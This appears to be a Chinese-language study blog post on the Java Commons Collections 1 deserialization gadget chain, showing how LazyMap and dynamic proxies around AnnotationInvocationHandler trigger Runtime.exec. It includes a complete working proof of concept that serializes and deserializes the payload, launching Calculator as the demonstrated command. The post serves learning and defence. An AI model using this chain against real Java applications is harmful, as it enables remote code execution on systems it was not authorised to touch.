@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>java 学习日程（五） | f4l1k_blog</title><meta name="keywords" content="java_study"><meta name="author" content="f4l1k"><meta name="copyright" content="f4l1k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="day5—反序列化lazyMap我们接着跟随P牛学习反序列化。前面P牛给我们介绍了利用TransformedMap去构造CommonCollections1的利用链，但当我们看到ysoserial中时，会发现它并不是利用TransformedMap去构造的，二十利用到了另一个类lazyMap,那我们今天就去学习如何利用lazyMap去构造一个正经的CommonCollections1利用链 123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java 学习日程（五）">
+<meta property="og:url" content="http://example.com/2021/11/16/java_study/java_day5/index.html">
+<meta property="og:site_name" content="f4l1k_blog">
+<meta property="og:description" content="day5—反序列化lazyMap我们接着跟随P牛学习反序列化。前面P牛给我们介绍了利用TransformedMap去构造CommonCollections1的利用链，但当我们看到ysoserial中时，会发现它并不是利用TransformedMap去构造的，二十利用到了另一个类lazyMap,那我们今天就去学习如何利用lazyMap去构造一个正经的CommonCollections1利用链 123">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/fire.JPG">
+<meta property="article:published_time" content="2021-11-16T06:17:24.000Z">
+<meta property="article:modified_time" content="2021-11-17T08:26:32.636Z">
+<meta property="article:author" content="f4l1k">
+<meta property="article:tag" content="java_study">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/fire.JPG"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/11/16/java_study/java_day5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java 学习日程（五）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-11-17 16:26:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/konglong.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fire.JPG')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">f4l1k_blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">java 学习日程（五）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-11-16T06:17:24.000Z" title="Created 2021-11-16 14:17:24">2021-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-11-17T08:26:32.636Z" title="Updated 2021-11-17 16:26:32">2021-11-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>6min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="java 学习日程（五）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="day5—反序列化"><a href="#day5—反序列化" class="headerlink" title="day5—反序列化"></a>day5—反序列化</h2><h3 id="lazyMap"><a href="#lazyMap" class="headerlink" title="lazyMap"></a>lazyMap</h3><p>我们接着跟随P牛学习反序列化。前面P牛给我们介绍了利用<code>TransformedMap</code>去构造<code>CommonCollections1</code>的利用链，但当我们看到<code>ysoserial</code>中时，会发现它并不是利用<code>TransformedMap</code>去构造的，二十利用到了另一个类<code>lazyMap</code>,那我们今天就去学习如何利用<code>lazyMap</code>去构造一个正经的<code>CommonCollections1</code>利用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; (Transformer)<span class="keyword">new</span> ConstantTransformer(Integer.valueOf(<span class="number">1</span>)) &#125;);</span><br><span class="line">Transformer[] transformers = &#123; (Transformer)<span class="keyword">new</span> ConstantTransformer(Runtime.class), (Transformer)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;), (Transformer)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;), (Transformer)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, (Object[])execArgs), (Transformer)<span class="keyword">new</span> ConstantTransformer(Integer.valueOf(<span class="number">1</span>)) &#125;;</span><br><span class="line">Map&lt;Object, Object&gt; innerMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, (Transformer)chainedTransformer);</span><br><span class="line">Map mapProxy = (Map)Gadgets.createMemoitizedProxy(lazyMap, Map.class, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">Reflections.setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure>
+
+<p>通过源码我们可以看出，前面都和我们之前构造一样，只是这里是用的是<code>Map lazyMap = LazyMap.decorate(innerMap, (Transformer)chainedTransformer);</code>。而之前我们使用的是<code>Map outerMap = TransformedMap.decorate(innerMap,null, transformerChain );</code>，我们对比一下两者有什么区别</p>
+<p>那我们都知道，我们使用<code>TransformedMap</code>的主要目的是去触发<code>transform()</code>,前面<code>TransformedMap</code>是在往<code>Map</code>中添加元素时触发的，但是<code>lazyMap</code>是在<code>get</code>方法中触发的</p>
+<p><img src="/2021/11/16/java_study/java_day5/image-20211116145948875.png" alt="image-20211116145948875"></p>
+<p>我们注意到，这里并不是直接使用<code>get()</code>方法就可以触发，而是处理当我们去获取一个不存在的键时会触发该方法，所以我们的思路比较明确,我们只需要去获取一个不存在的<code>Map</code>即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">lazyMap.get(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>TransformedMap</code>时，我们可以通过<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>去调用<code>put</code>方法，那么我们使用<code>lazyMap</code>时该如何去调用<code>get()</code>方法呢？</p>
+<p>这里我们还是使用<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，但不是使用他的<code>readObject</code>，我们注意到，在它的<code>invoke</code>方法中使用到了<code>get()</code>方法</p>
+<p><img src="/2021/11/16/java_study/java_day5/image-20211116151318371.png" alt="image-20211116151318371"></p>
+<p>但是，我们这里是反序列化，不能直接使用方法去调用，我们要使用其他途径来调用这个方法</p>
+<h3 id="Java对象代理"><a href="#Java对象代理" class="headerlink" title="Java对象代理"></a>Java对象代理</h3><p>按照P牛和ysoserial的方法，是使用到了对象代理</p>
+<p>主要分为静态代理和动态代理，而我们这里是用到的是动态代理</p>
+<blockquote>
+<p>与静态代理类对照的是动态代理类，动态代理类的字节码在程序运行时由 Java 反射机制动态生成，无需程序员手工编写它的源代码。动态代理类不仅简化了编程工作，而且提高了软件系统的可扩展性，因为 Java 反射机制可以生成任意类型的动态代理类。<code>java.lang.reflect</code> 包中的 Proxy 类和<code>InvocationHandler</code> 接口提供了生成动态代理类的能力</p>
+</blockquote>
+<p>我们可以注意到<code>AnnotationInvocationHandler</code>刚好是实现了<code>InvocationHandler</code>，并且当我们去使用动态代理时会调用其中的<code>invoke</code>方法，我们跟随P牛来看个简单的例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo_dl</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo_dl</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们实现了一个<code>InvocationHandler</code>并尝试通过代理的方式去调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map test = <span class="keyword">new</span> HashMap();</span><br><span class="line">InvocationHandler invocationHandler = <span class="keyword">new</span> Demo_dl(test);</span><br><span class="line">Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">proxyMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">String result = (String) proxyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>
+
+<p>我们正常使用<code>get</code>方法获取的是对应键的值，那么这里我们做了个动态代理，新增了一个方法，当我们调用<code>get</code>方法时会返回<code>Hacked Object</code></p>
+<p><img src="/2021/11/16/java_study/java_day5/image-20211117143118115.png" alt="image-20211117143118115"></p>
+<p>实现的方法主要是下面两行代码，其中第二行代码是实现动态代理，一共传入三个参数</p>
+<ul>
+<li>loader：一个classloader对象，定义了由哪个classloader对象对生成的代理类进行加载</li>
+<li>interfaces：一个interface对象数组，表示我们将要给我们的代理对象提供一组什么样的接口，如果我们提供了这样一个接口对象数组，那么也就是声明了代理类实现了这些接口，代理类就可以调用接口中声明的所有方法。</li>
+<li>h：一个InvocationHandler对象，表示的是当动态代理对象调用方法的时候会关联到哪一个InvocationHandler对象上，并最终由其调用。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler invocationHandler = <span class="keyword">new</span> Demo_dl(test);</span><br><span class="line">Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure>
+
+<p>那么接下来我们就需要去实现我们的poc了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler  = (InvocationHandler)constructor.newInstance(Retention.class,lazyMap);</span><br><span class="line">Map test =  (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler)constructor.newInstance(Retention.class,test);</span><br><span class="line">FileOutputStream baos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectOutputStream oi = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">oi.writeObject(handler);</span><br><span class="line">oi.close();</span><br><span class="line">FileInputStream obj = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectInputStream obtest = <span class="keyword">new</span> ObjectInputStream(obj);</span><br><span class="line">obtest.readObject();</span><br><span class="line">obtest.close();</span><br></pre></td></tr></table></figure>
+
+<p>在我们实现代理之后，又实现了一遍<code>handler</code>，这是因为最终我们实现反序列化的类是<code>AnnotationInvocationHandler</code>，如果我们没有实现这一步，你会发现我们实际只完成到了压缩<code>lazyMap</code>这一步，并没有将动态代理压缩到反序列化中</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">f4l1k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/11/16/java_study/java_day5/">http://example.com/2021/11/16/java_study/java_day5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java-study/">java_study</a></div><div class="post_share"><div class="social-share" data-image="/img/fire.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/11/02/java_study/java_day4/"><img class="next-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">java 学习日程（四）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/31/java_study/java_day1/" title="java 学习日程（一）"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">java 学习日程（一）</div></div></a></div><div><a href="/2021/10/31/java_study/java_day2/" title="java 学习日程（二）"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">java 学习日程（二）</div></div></a></div><div><a href="/2021/10/31/java_study/java_day3/" title="java 学习日程（三）"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">java 学习日程（三）</div></div></a></div><div><a href="/2021/11/02/java_study/java_day4/" title="java 学习日程（四）"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">java 学习日程（四）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/konglong.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">f4l1k</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/falipan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/falipan" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#day5%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">day5—反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lazyMap"><span class="toc-number">1.1.</span> <span class="toc-text">lazyMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%AF%B9%E8%B1%A1%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">Java对象代理</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By f4l1k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
